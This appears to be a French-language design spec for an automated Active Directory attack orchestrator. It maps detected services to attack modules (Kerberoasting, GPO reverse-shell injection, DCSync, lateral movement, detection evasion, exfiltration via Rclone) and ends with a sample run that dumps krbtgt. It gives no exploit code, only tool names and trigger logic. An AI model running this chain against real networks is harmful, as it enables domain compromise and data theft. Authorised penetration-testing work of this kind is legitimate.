## 🧭 INTERFACE PRINCIPALE — `ad_infra_cli()`  
> Console interactive textuelle pour dialoguer avec l’orchestrateur Active Directory  
> Tout est modulaire, chaque appel déclenche des modules selon les signaux et hypothèses précédemment analysés.

---

### 🧮 STRUCTURE D’INTERACTION

```plaintext
╔═══════════════════════════════════════════════╗
║         DARKMOON - Active Directory CLI       ║
╠═══════════════════════════════════════════════╣
║ 1. 🎯 Lancer reconnaissance initiale           ║
║ 2. 🧠 Auto-analyse des patterns de signaux     ║
║ 3. 🔍 Exécuter module : Kerberos               ║
║ 4. 🛠️ Exécuter module : SMB                   ║
║ 5. 📚 Exécuter module : LDAP                  ║
║ 6. 🧾 Exécuter module : GPO                   ║
║ 7. 📜 Exécuter module : ADCS                  ║
║ 8. 🚀 Exécuter module : Privilege Escalation  ║
║ 9. 🪟 Exécuter module : RDP                   ║
║ 10. 🌐 Exécuter module : WinRM                ║
║ 11. 🧬 Exécuter module : Token Abuse          ║
║ 12. 🔁 Exécuter module : Lateral Movement     ║
║ 13. 🧪 Exécuter module : DCSync                ║
║ 14. 🔧 Exécuter module : Local Priv Esc        ║
║ 15. 🕵️‍♂️ Exécuter module : Exfiltration        ║
║ 16. 🧯 Exécuter module : Evasion & Bypass     ║
║-----------------------------------------------║
║ A. 🤖 Lancer AUTOMATION INTELLIGENTE           ║
║ B. 🗂️  Générer rapport complet                 ║
║ Q. ❌ Quitter le module AD                     ║
╚═══════════════════════════════════════════════╝
```

---

### 💬 PROMPT INTERNE UTILISATEUR

> Ce que vous tapez :

```
/start_ad -t 192.168.1.25 --domain corp.local --os WindowsServer2016 --kerberos --smb --ldap
```

> Ce que l’orchestrateur exécute automatiquement :

- Reconnaissance Nmap initiale
- Détection des ports 445, 88, 389
- Trigger `ad_kerberos_module()`, `ad_smb_module()`, `ad_ldap_module()`
- Si résultat LDAP = groupes Domain Admin, alors : trigger `ad_privilege_escalation_chain()`

---

### 🧠 COMPORTEMENT INTELLIGENT AUTO-MODULE

```plaintext
IF kerberos == true AND signal AS-REP no preauth detected
  → Trigger ad_kerberos_module()

IF ldap == true AND anonymous_bind == OK
  → Trigger ad_ldap_module()

IF smb == true AND smbclient -N OK
  → Trigger ad_smb_module() THEN ad_gpo_module()

IF WinRM detected AND creds == valid
  → Trigger ad_winrm_module() THEN ad_lateral_pivot_module()

IF GPO writable detected
  → Trigger ad_gpo_module() THEN ad_localprivesc_module()
```

---

### 🛠️ OUTILS UTILISÉS PAR CHAQUE COMMANDE

| Module                         | Tools Appelés                                                        |
|-------------------------------|----------------------------------------------------------------------|
| `ad_kerberos_module()`        | GetNPUsers.py, Rubeus, hashcat                                       |
| `ad_smb_module()`             | smbclient, rpcclient, nmap NSE, crackmapexec                         |
| `ad_ldap_module()`            | ldapsearch, ldapdomaindump, bloodhound-python                        |
| `ad_gpo_module()`             | gpp-decrypt, polenum, powershell reverse shell injection             |
| `ad_adcs_module()`            | certipy, mimikatz, pfx2john                                          |
| `ad_privilege_escalation_chain()` | bloodhound, sid_inject, esc8_shadow                               |
| `ad_rdp_module()`             | rdpscan, metasploit, hydra                                           |
| `ad_winrm_module()`           | evil-winrm, crackmapexec, Seatbelt                                   |
| `ad_token_module()`           | incognito, Rubeus, SharpToken                                        |
| `ad_lateral_pivot_module()`   | crackmapexec, PsExec, Invoke-WMIExec                                 |
| `ad_dcsync_module()`          | secretsdump.py, mimikatz                                             |
| `ad_localprivesc_module()`    | SharpUp, winPEAS, PowerUp                                            |
| `ad_exfiltration_module()`    | mimikatz, net, smbclient, Rclone                                     |
| `ad_detection_evasion_module()` | PSOffuscatron, Donut, Empire                                       |

---
 
**Déclenchement intelligent des modules AD avec logique heuristique et adaptative**

---

## 🔄 `engine_ad_automation(target: ADTarget)`  
Ce module agit comme le **cerveau heuristique central**, orchestrant dynamiquement tous les sous-modules à partir des signaux détectés, de la cartographie, des patterns MITRE/CVE/CPE et des combinaisons de services.

---

### 🧠 STRATÉGIE D’ACTIVATION

```markdown
1. Lancer reconnaissance initiale → Portscan + Fingerprint
2. Extraire Signaux techniques : ports, bannières, protocoles
3. Corréler les Signaux → Hypothèses MITRE ATT&CK / CVE
4. Lancer modules selon pattern :

   IF port 88 && no-preauth == TRUE THEN ➜ ad_kerberos_module()
   IF port 445 && SMBv1 == TRUE THEN ➜ ad_smb_module()
   IF LDAP anonymous == TRUE THEN ➜ ad_ldap_module()
   IF ADCS enabled && user enrolled == TRUE THEN ➜ ad_adcs_module()
   IF group “Domain Admins” accessible THEN ➜ ad_privilege_escalation_chain()
   IF RDP && CVE-2019-0708 present THEN ➜ ad_rdp_module()
   IF WinRM OK && Creds valid THEN ➜ ad_winrm_module() + ad_token_module()
   IF PowerUp finds vuln task/service THEN ➜ ad_localprivesc_module()
   IF BloodHound shows DCSync right THEN ➜ ad_dcsync_module()
   IF SMB share has secrets or SYSVOL THEN ➜ ad_exfiltration_module()
```

---

### 📊 EXEMPLE DE CHAÎNE DE DÉCISION RÉELLE

```plaintext
→ Portscan : 445, 389, 88, 135, 3389 detected
→ OS Banner: Windows Server 2019 Domain Controller
→ LDAP bind OK, SPN exposed, SMB null session, WinRM open

→ Lancement des modules suivants :
  - ad_smb_module()          → null session + share access
  - ad_kerberos_module()     → Kerberoasting possible
  - ad_ldap_module()         → anonymous bind OK → enumerate domain
  - ad_winrm_module()        → shell remote activé
  - ad_privilege_escalation_chain() → BloodHound confirms path
```

---

### 🔁 LOGIQUE D’ITÉRATION CYCLIQUE

```plaintext
FOR each signal:
  match(signal) → hypothesis[]
  FOR each hypothesis:
    test(hypothesis) → experiment[]
    FOR each experiment:
      execute(experiment)
      IF confirmed == true:
         react(NextStep) → trigger module[]
```

---

### 📦 OUTPUT FINAL & JOURNALISATION

- Tous les modules écrivent dans : `/output/ad/<target_ip>/<module>/`
- Un fichier `pentest_report_ad.md` est généré avec :
  - Liste des vulnérabilités
  - Mapping MITRE ATT&CK
  - Commandes exécutées
  - Scripts générés
  - Exploits réussis
  - Recommandations
- Export automatique possible `.pdf`, `.html`, `.txt`

---

## 🔚 PROMPT FINAL — `GIGAENGINE_AD`

```markdown
❯ INIT_AD -target 192.168.1.20 -domain corp.local -os WindowsServer2019

    🔁 Reconnaissance...
    🧠 Analyse heuristique...
    ⚙️ Modules déclenchés :
        ✓ Kerberos ➜ as-rep roasting (Rubeus)
        ✓ SMB ➜ SYSVOL GPP password found
        ✓ LDAP ➜ User + OU enum
        ✓ GPO ➜ Script injection dans logon.bat
        ✓ WinRM ➜ Shell obtenu avec evil-winrm
        ✓ PrivEsc ➜ Unquoted service exploited
        ✓ DCSync ➜ krbtgt dumped with secretsdump.py
        ✓ Exfiltration ➜ Secrets encoded, exfiltrés via Rclone

    📁 Rapport : /output/ad/192.168.1.20/pentest_report_ad.md
```

---
